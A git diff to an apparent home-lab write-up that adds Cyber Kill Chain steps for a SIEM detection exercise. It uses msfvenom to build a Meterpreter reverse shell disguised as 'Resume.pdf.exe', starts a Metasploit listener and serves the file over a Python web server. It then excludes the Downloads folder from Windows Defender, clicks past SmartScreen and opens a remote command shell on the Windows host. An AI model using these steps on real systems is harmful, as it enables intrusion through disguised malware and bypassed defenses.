@@ -166,7 +166,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
 1. In the local machine go to: [https://www.splunk.com/en_us/download/splunk-enterprise.html](https://www.splunk.com/en_us/download/splunk-enterprise.html). It requires an account to try the tool for 60 days.
     
-    In this case, you may use a temporary email with: [https://temp-mail.org/](https://temp-mail.org/), which could serve as a workaround everytime Splunk is tested out.
+    In this case, you may use a temporary email with: [https://temp-mail.org](https://temp-mail.org), which could serve as a workaround everytime Splunk is tested out.
 
     ![Splunk Account](../../images/40-2-labs/you-give-hr-a-bad-pdf/029.png){: .popup-img }
 
@@ -507,3 +507,160 @@ Nmap is a free and open source utility for network mapping and security auditing
     ![Nmap Port Scan](../../images/40-2-labs/you-give-hr-a-bad-pdf/081.png){: .popup-img }
 
 3. Nmap found port `3389` open, which corresponds to the Remote Desktop Protocol (RDP). This information will be used for the next stage.
+
+### Weaponization
+MSFvenom is a Metasploit utility for generating payloads, shellcodes, and exploits. This tool is being used to create the reverse shell payload, allowing remote access control on the victim's device. Alongside, Msfconsole will be used to listen on a predefined port.
+
+1. Msfvenom has a manual which can be looked at, by simply typing `msfvenom -h`.
+
+    ![Msfvenom Help](../../images/40-2-labs/you-give-hr-a-bad-pdf/082.png){: .popup-img }
+
+2. List the payloads with `msfvenom -l payloads`, and find `windows/x64/meterpreter/reverse_tcp`, which uses in-memory DLL injection to avoid writing files to disk, making it stealthier than traditional payloads.
+
+    ![Msfvenom Payloads](../../images/40-2-labs/you-give-hr-a-bad-pdf/083.png){: .popup-img }
+
+    For faster finding, add a search pipe to the command like: 
+    
+    ```powershell
+    msfvenom -l payloads | grep reverse_tcp
+    ```
+
+    ![Msfvenom Payloads Grep](../../images/40-2-labs/you-give-hr-a-bad-pdf/084.png){: .popup-img }
+
+3. Create the reverse shell payload with the following command:
+
+    ```powershell
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.2 lport=4444 -f exe -o Resume.pdf.exe
+    ```
+
+    ![Msfvenom Payload Creation](../../images/40-2-labs/you-give-hr-a-bad-pdf/085.png){: .popup-img }
+
+    Where `-p` specifies the payload, `lhost` establishes the listening machine IP, `lport` sets the listening port, `-f` defines the format, and `-o` saves the payload into the file `Resume.pdf.exe`
+
+    The file was saved in the path `/home/kali/`. It can be moved to a more convenient place like `/home/kali/Desktop/`
+
+    ![Msfvenom File Location](../../images/40-2-labs/you-give-hr-a-bad-pdf/086.png){: .popup-img }
+
+    Also, the file type can be retrieved with the command `file Resume.pdf.exe`
+
+    ![Msfvenom File Type](../../images/40-2-labs/you-give-hr-a-bad-pdf/087.png){: .popup-img }
+
+4. Open Metasploit by typing `msfconsole`
+
+    ![Msfconsole](../../images/40-2-labs/you-give-hr-a-bad-pdf/088.png){: .popup-img }
+
+    Now, execute `use exploit/multi/handler`, which helps to manage the incoming connection from the payload.
+
+    ![Msfconsole Multi Handler](../../images/40-2-labs/you-give-hr-a-bad-pdf/089.png){: .popup-img }
+
+    By typing `options`, the payload information will be displayed, and needs to be updated with the actual payload `windows/x64/meterpreter/reverse_tcp`
+
+    ![Msfconsole Incorrect Options](../../images/40-2-labs/you-give-hr-a-bad-pdf/090.png){: .popup-img }
+
+    To do that, execute `set payload windows/x64/meterpreter/reverse_tcp`
+
+    ![Msfconsole Set Payload](../../images/40-2-labs/you-give-hr-a-bad-pdf/091.png){: .popup-img }
+
+    Also, the lhost needs to be configured as `set lhost 10.0.0.2`
+
+    ![Msfconsole Set Lhost](../../images/40-2-labs/you-give-hr-a-bad-pdf/092.png){: .popup-img }
+
+    Double check the options, which should look like the following:
+
+    ![Msfconsole Correct Options](../../images/40-2-labs/you-give-hr-a-bad-pdf/093.png){: .popup-img }
+
+    Finally, execute `exploit` to start listening in port `4444`.
+
+    ![Msfconsole Exploit Listening](../../images/40-2-labs/you-give-hr-a-bad-pdf/094.png){: .popup-img }
+
+### Delivery
+Python HTTP Server is an utility for serving content over a network. This tool is being used to host the `Resume.pdf.exe` file, so the Windows machine can retrieve and execute it.
+
+1. In order to display the malicious file, execute the following command:
+
+    ```bash
+    python3 -m http.server 9999
+    ```
+
+    ![Python Server](../../images/40-2-labs/you-give-hr-a-bad-pdf/095.png){: .popup-img }
+
+    Where `-m` runs the `http.server` module as a script, opening port `9999` for file sharing.
+
+2. It is possible to disable Windows Defender. Although, there is an easier approach, that is adding a folder as exclusion, in this case, the `Downloads` folder.
+
+    To do it, go to `Windows Security`, then `Virus & threat protection`, and below the section `Virus & threat protection settings` click on `Manage settings`.
+
+    ![Windows Security Panel](../../images/40-2-labs/you-give-hr-a-bad-pdf/096.png){: .popup-img }
+    
+    After that, scroll down and click on `Add or remove exclusions`.
+
+    ![Windows Security Exclusions](../../images/40-2-labs/you-give-hr-a-bad-pdf/097.png){: .popup-img }
+
+    Then, click on `Add an exclusion`, select `Folder` and search the `Downloads` folder.
+
+    ![Windows Security Excluded Folder](../../images/40-2-labs/you-give-hr-a-bad-pdf/098.png){: .popup-img }
+
+3. In the browser, type `http://10.0.0.2:9999` and download the `Resume.pdf.exe` file.
+
+    ![Hosted Malicious File](../../images/40-2-labs/you-give-hr-a-bad-pdf/099.png){: .popup-img }
+
+    SmartScreen pops up rejecting the attempted download. It is a Windows Security feature that protects against phishing or malware websites.
+
+    ![SmartScreen Pop-up](../../images/40-2-labs/you-give-hr-a-bad-pdf/100.png){: .popup-img }
+
+    To skip the protection, click on the three dots `...` and select `Keep`.
+
+    ![SmartScreen Keep File](../../images/40-2-labs/you-give-hr-a-bad-pdf/101.png){: .popup-img }
+
+    The file should be saved into the `Downloads` folder.
+
+    ![Downloaded Malicious File](../../images/40-2-labs/you-give-hr-a-bad-pdf/102.png){: .popup-img }
+
+### Exploitation, Installation, Command & Control (C2)
+Since a Metasploit payload is being used, the exploitation, installation and C2 stages are being automated by the malicious file `Resume.pdf.exe`, as shown in the following steps.
+
+1. The `.exe` extension can be seen due to `File name extensions` option is enabled at the `View` -> `Show` tabs. Also, it's a good practice to enable the `Hidden items` option.
+
+    ![View Options](../../images/40-2-labs/you-give-hr-a-bad-pdf/103.png){: .popup-img }
+
+2. Check the SHA512 hash of `Resume.pdf.exe`, as seen in the step 2 of the Splunk Setup.
+
+    ![Malicious File Incomplete Hash](../../images/40-2-labs/you-give-hr-a-bad-pdf/104.png){: .popup-img }
+
+    The hash is cut, to display the full characters, execute the following command:
+
+    ```powershell
+    (Get-FileHash <file-name> -Algorithm SHA512).Hash
+    ```
+
+    ![Malicious File Complete Hash](../../images/40-2-labs/you-give-hr-a-bad-pdf/105.png){: .popup-img }
+
+    Looking for the hash in VirusTotal, it does not find anything.
+
+    ![VirusTotal Lookup](../../images/40-2-labs/you-give-hr-a-bad-pdf/106.png){: .popup-img }
+    
+    This explains how hashes work, any minor variation made to a file, its hash changes completely, preventing detection in open-source Threat Intelligence databases.
+
+3. Now, double click on the `Resume.pdf.exe`. When the SmartScreen warning shows up, click on `Run`.
+
+    ![Malicious File Execution](../../images/40-2-labs/you-give-hr-a-bad-pdf/107.png){: .popup-img }
+
+    It will execute the malware, but no signs of visible UI is shown in the Windows host.
+
+### Actions on Objectives
+This is the last stage of the Cyber Kill Chain, where the attacker can perform any actions in the Windows host, one of them could be executing CMD commands for further discovery of the system and internal network.
+
+1. In the Kali Linux host, there is a successful opened session with the Windows host. Type `shell`, in order to open the Windows Command Prompt.
+
+    ![Remote CMD](../../images/40-2-labs/you-give-hr-a-bad-pdf/108.png){: .popup-img }
+
+2. To create logs for Splunk, enter `net user`, `net localgroup` and `ipconfig`
+
+    ![Commands Execution](../../images/40-2-labs/you-give-hr-a-bad-pdf/109.png){: .popup-img }
+
+    In this case, `net user` displays the local computer accounts, `net localgroup` shows the local groups of the device and `ipconfig` permits to visualize the TCP/IP network configuration.
+
+3. For any other particular use case, may refer to the meterpreter documentation by typing `help`
+
+    ![Meterpreter Help](../../images/40-2-labs/you-give-hr-a-bad-pdf/110.png){: .popup-img }
+
